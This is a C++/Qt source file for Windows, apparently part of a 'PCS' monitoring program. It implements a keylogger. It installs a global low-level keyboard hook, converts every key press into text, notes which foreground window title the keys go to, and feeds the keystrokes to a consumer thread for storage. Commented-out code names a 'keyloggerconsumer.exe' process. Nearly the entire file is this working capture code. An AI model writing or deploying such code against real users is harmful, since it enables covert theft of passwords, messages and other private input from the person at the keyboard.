/*
* Copyright (C) 2014 - Center of Excellence in Information Assurance
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
#include <QtCore/QCoreApplication>
#include <QtSql/QtSql>
#include <QProcess>
#include <QSharedMemory>
#include <windows.h>
#include <lm.h>
#include <assert.h>
#include "globaldata.h"
#include "consumerthread.h"
#include "consumer.h"
#include "../Global/global.h"


using namespace std;
//#define _WIN32_WINNT 0x0500

QString INSTALL_PATH;
QString SHARED_PATH;
QString DB_PATH;
QString CONNECTCMD_FILE_PATH;
QString USER_ID_FILE_PATH;
QString SCREENSHOTS_PATH;

QProcess _process;
QSharedMemory _sharedMemory;
QString _previousAppName ;
QString _appName ;
bool _addRecord = false;
QChar _buffer[BUFFER_SIZE];
int bufferIndex = 0;
int size = 0;
QString keyLogBuffer;

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
HKL getKeyboardLayout();
bool establishConnection();

int main(int argc,char* argv[])
{
    QCoreApplication a(argc,argv);
    QDir::setCurrent(QCoreApplication::applicationDirPath());

    if (QSysInfo::windowsVersion() == QSysInfo::WV_XP || QSysInfo::windowsVersion() == QSysInfo::WV_2003)
        SHARED_PATH = SHARED_PATH_WINDOWS_XP;
    else if (QSysInfo::windowsVersion() == QSysInfo::WV_VISTA)
        SHARED_PATH = SHARED_PATH_WINDOWS_VIST;
    else
        SHARED_PATH = SHARED_PATH_WINDOWS_7;

    QDir dir;
    dir.cdUp();
    INSTALL_PATH = dir.toNativeSeparators(dir.path());

    // Files PATH
    DB_PATH = INSTALL_PATH + "\\" + PCSDB_NAME;
    CONNECTCMD_FILE_PATH = INSTALL_PATH + "\\connectcmd.txt";
    USER_ID_FILE_PATH = INSTALL_PATH + "\\userId.txt";
    SCREENSHOTS_PATH = INSTALL_PATH + "\\Screenshots";

    if (!establishConnection())
        return -1;

//    QString pName = "\"C:\\PCS\\bin\\keyloggerconsumer.exe\"";
//    _process.start(pName);
//    if (!_process.waitForStarted()) {
//        qDebug() << "Consumer can not start: " << _process.errorString();
//    }

//    _sharedMemory.setKey("keyloggerBuffer");
//    if (!_sharedMemory.create(1024)) {
//        qDebug() << "Unable to create shared memory segment.";
//    }

    ConsumerThread consumerThread;
    consumerThread.start();

//    Consumer consumer;

    HINSTANCE hInstance=GetModuleHandle(NULL);
    HHOOK keyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL,keyboardHookProc,hInstance, 0);

    MSG msg;
    while (GetMessage(&msg,0,0,0) > 0) {
            //a.processEvents();
            TranslateMessage(&msg);
            DispatchMessage(&msg);
    }

//    _process.kill();
    return a.exec();
}


HKL getKeyboardLayout() {
    HWND handle = GetForegroundWindow();
    LPTSTR buffer =  new TCHAR[256];

    DWORD threadId = GetWindowThreadProcessId(handle,0);
    HKL layout = GetKeyboardLayout(threadId);

    if (GetWindowText(handle,buffer,256) > 0) {
        _appName = QString::fromWCharArray(buffer);
        if (_previousAppName != _appName)
            _addRecord = true;
        _previousAppName = _appName;
    }

   return layout;
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);


    QString currentText;

    // Read character if key is press.
    if (wParam == WM_KEYDOWN) {
        qDebug() << "Hook";
        HKL layout = getKeyboardLayout();
        BYTE keystate[256];
        GetKeyboardState(keystate);

        LPWSTR buf = new TCHAR[10];

        if (p->vkCode == 0x08)
            currentText = "[BS]";
        else if (p->vkCode == 0x0d)
            currentText = " ";
        else {
          ToUnicodeEx(p->vkCode,p->vkCode,keystate,buf,10,0,layout);
          currentText = QString::fromWCharArray(buf);
        }

//        QBuffer buffer;
//        buffer.open(QBuffer::ReadWrite);
//        QDataStream out(&buffer);
//        out << currentText;
//        int size = buffer.size();

//        _sharedMemory.lock();
//        char* to = (char*) _sharedMemory.data();
//        const char* from = buffer.data().data();
//        memcpy(to,from,qMin(_sharedMemory.size(),size));
//        _sharedMemory.unlock();

        //############################

          // Producer Consumer.
        emptyCount.acquire();
        for (int i=0; i<currentText.length(); ++i) {
            _buffer[bufferIndex] = currentText[i];
            bufferIndex++;
            size++;
        }
        fullCount.release();

        //############################

        //keyLogBuffer += currentText;
   }

   return CallNextHookEx(NULL, nCode, wParam, lParam);
}

bool establishConnection() {
    if (!QFile::exists(DB_PATH))
        return false;

    QSqlDatabase db = QSqlDatabase::addDatabase("QSQLITE");
    db.setHostName("localhost");
    db.setDatabaseName(DB_PATH);
    db.setUserName("");

    if (!db.open()) {
        qDebug() << "Cannot open database";
        return false;
    }

    return true;
}
